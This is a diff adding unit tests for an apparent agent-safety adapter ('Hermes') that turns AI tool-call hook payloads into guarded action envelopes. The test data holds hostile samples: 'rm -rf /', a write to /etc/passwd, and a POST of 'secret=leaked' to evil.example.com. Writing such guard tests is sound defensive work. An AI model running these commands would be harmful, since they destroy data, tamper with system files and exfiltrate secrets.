@@ -2,6 +2,7 @@ import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import { ClaudeCodeAdapter } from '../adapters/claude-code.js';
 import { OpenClawAdapter } from '../adapters/openclaw.js';
+import { HermesAdapter } from '../adapters/hermes.js';
 import {
   isSensitivePath,
   shouldDenyAtLevel,
@@ -327,6 +328,216 @@ describe('OpenClawAdapter', () => {
   describe('inferInitiatingSkill', () => {
     it('should return null (not yet supported)', async () => {
       const input = adapter.parseInput({ toolName: 'exec', params: {} });
+      const skill = await adapter.inferInitiatingSkill(input);
+      assert.equal(skill, null);
+    });
+  });
+});
+
+// ─────────────────────────────────────────────────────────────────────────────
+// HermesAdapter
+// ─────────────────────────────────────────────────────────────────────────────
+
+describe('HermesAdapter', () => {
+  const adapter = new HermesAdapter();
+
+  it('should have name "hermes"', () => {
+    assert.equal(adapter.name, 'hermes');
+  });
+
+  describe('parseInput', () => {
+    it('should parse Hermes shell-hook payload (snake_case → canonical)', () => {
+      const payload = {
+        hook_event_name: 'pre_tool_call',
+        tool_name: 'terminal',
+        tool_input: { command: 'rm -rf /' },
+        session_id: 'sess_abc123',
+        cwd: '/home/user/project',
+        extra: { task_id: 't1', tool_call_id: 'tc1' },
+      };
+      const input = adapter.parseInput(payload);
+      assert.equal(input.toolName, 'terminal');
+      assert.deepEqual(input.toolInput, { command: 'rm -rf /' });
+      assert.equal(input.eventType, 'pre');
+      assert.equal(input.sessionId, 'sess_abc123');
+      assert.equal(input.cwd, '/home/user/project');
+    });
+
+    it('should detect post events from hook_event_name prefix', () => {
+      const input = adapter.parseInput({
+        hook_event_name: 'post_tool_call',
+        tool_name: 'terminal',
+        tool_input: {},
+      });
+      assert.equal(input.eventType, 'post');
+    });
+
+    it('should treat non-tool events (session/llm) as pre by default', () => {
+      const input = adapter.parseInput({
+        hook_event_name: 'pre_llm_call',
+        tool_name: null,
+        tool_input: null,
+      });
+      assert.equal(input.eventType, 'pre');
+      assert.equal(input.toolName, '');
+      assert.deepEqual(input.toolInput, {});
+    });
+
+    it('should handle empty event', () => {
+      const input = adapter.parseInput({});
+      assert.equal(input.toolName, '');
+      assert.deepEqual(input.toolInput, {});
+      assert.equal(input.eventType, 'pre');
+      assert.equal(input.sessionId, undefined);
+      assert.equal(input.cwd, undefined);
+    });
+  });
+
+  describe('mapToolToActionType', () => {
+    it('should map terminal to exec_command', () => {
+      assert.equal(adapter.mapToolToActionType('terminal'), 'exec_command');
+    });
+
+    it('should map exec / shell aliases to exec_command', () => {
+      assert.equal(adapter.mapToolToActionType('exec'), 'exec_command');
+      assert.equal(adapter.mapToolToActionType('shell'), 'exec_command');
+    });
+
+    it('should map write_file and patch to write_file', () => {
+      assert.equal(adapter.mapToolToActionType('write_file'), 'write_file');
+      assert.equal(adapter.mapToolToActionType('patch'), 'write_file');
+    });
+
+    it('should map read_file to read_file', () => {
+      assert.equal(adapter.mapToolToActionType('read_file'), 'read_file');
+    });
+
+    it('should map fetch / http_request to network_request', () => {
+      assert.equal(adapter.mapToolToActionType('fetch'), 'network_request');
+      assert.equal(adapter.mapToolToActionType('http_request'), 'network_request');
+    });
+
+    it('should support prefix matching for tool families', () => {
+      assert.equal(adapter.mapToolToActionType('terminal_python'), 'exec_command');
+      assert.equal(adapter.mapToolToActionType('fetch_json'), 'network_request');
+    });
+
+    it('should return null for unknown tools', () => {
+      assert.equal(adapter.mapToolToActionType('unknown'), null);
+      assert.equal(adapter.mapToolToActionType('delegate_task'), null);
+    });
+
+    it('should respect custom guardedTools override', () => {
+      const custom = new HermesAdapter({
+        guardedTools: { my_exec: 'exec_command' },
+      });
+      assert.equal(custom.mapToolToActionType('my_exec'), 'exec_command');
+      // Built-ins are overridden, not merged
+      assert.equal(custom.mapToolToActionType('terminal'), null);
+    });
+  });
+
+  describe('buildEnvelope', () => {
+    it('should build exec_command envelope from terminal tool', () => {
+      const input = adapter.parseInput({
+        hook_event_name: 'pre_tool_call',
+        tool_name: 'terminal',
+        tool_input: { command: 'ls -la' },
+        session_id: 'sess_xyz',
+      });
+      const envelope = adapter.buildEnvelope(input);
+      assert.ok(envelope);
+      assert.equal(envelope!.action.type, 'exec_command');
+      assert.equal(
+        (envelope!.action.data as unknown as Record<string, unknown>).command,
+        'ls -la',
+      );
+      // session_id from payload flows into envelope.context
+      assert.equal(envelope!.context.session_id, 'sess_xyz');
+      // actor.skill.source is 'hermes'
+      assert.equal(envelope!.actor.skill.source, 'hermes');
+    });
+
+    it('should build write_file envelope from patch tool', () => {
+      const input = adapter.parseInput({
+        hook_event_name: 'pre_tool_call',
+        tool_name: 'patch',
+        tool_input: { path: '/etc/passwd', content: 'junk' },
+      });
+      const envelope = adapter.buildEnvelope(input);
+      assert.ok(envelope);
+      assert.equal(envelope!.action.type, 'write_file');
+      assert.equal(
+        (envelope!.action.data as unknown as Record<string, unknown>).path,
+        '/etc/passwd',
+      );
+    });
+
+    it('should build network_request envelope from fetch tool', () => {
+      const input = adapter.parseInput({
+        hook_event_name: 'pre_tool_call',
+        tool_name: 'fetch',
+        tool_input: {
+          url: 'https://evil.example.com',
+          method: 'POST',
+          body: 'secret=leaked',
+        },
+      });
+      const envelope = adapter.buildEnvelope(input);
+      assert.ok(envelope);
+      assert.equal(envelope!.action.type, 'network_request');
+      assert.equal(
+        (envelope!.action.data as unknown as Record<string, unknown>).url,
+        'https://evil.example.com',
+      );
+      assert.equal(
+        (envelope!.action.data as unknown as Record<string, unknown>).method,
+        'POST',
+      );
+    });
+
+    it('should synthesise session_id when payload omits it', () => {
+      const input = adapter.parseInput({
+        hook_event_name: 'pre_tool_call',
+        tool_name: 'terminal',
+        tool_input: { command: 'ls' },
+      });
+      const envelope = adapter.buildEnvelope(input);
+      assert.ok(envelope);
+      assert.match(envelope!.context.session_id, /^hermes-\d+$/);
+    });
+
+    it('should return null for unmapped tools', () => {
+      const input = adapter.parseInput({
+        hook_event_name: 'pre_tool_call',
+        tool_name: 'delegate_task',
+        tool_input: {},
+      });
+      assert.equal(adapter.buildEnvelope(input), null);
+    });
+
+    it('should support file_path alias for write_file', () => {
+      const input = adapter.parseInput({
+        hook_event_name: 'pre_tool_call',
+        tool_name: 'write_file',
+        tool_input: { file_path: '/tmp/out.txt', file_text: 'data' },
+      });
+      const envelope = adapter.buildEnvelope(input);
+      assert.ok(envelope);
+      assert.equal(
+        (envelope!.action.data as unknown as Record<string, unknown>).path,
+        '/tmp/out.txt',
+      );
+    });
+  });
+
+  describe('inferInitiatingSkill', () => {
+    it('should return null (not yet supported in v1)', async () => {
+      const input = adapter.parseInput({
+        hook_event_name: 'pre_tool_call',
+        tool_name: 'terminal',
+        tool_input: {},
+      });
       const skill = await adapter.inferInitiatingSkill(input);
       assert.equal(skill, null);
     });
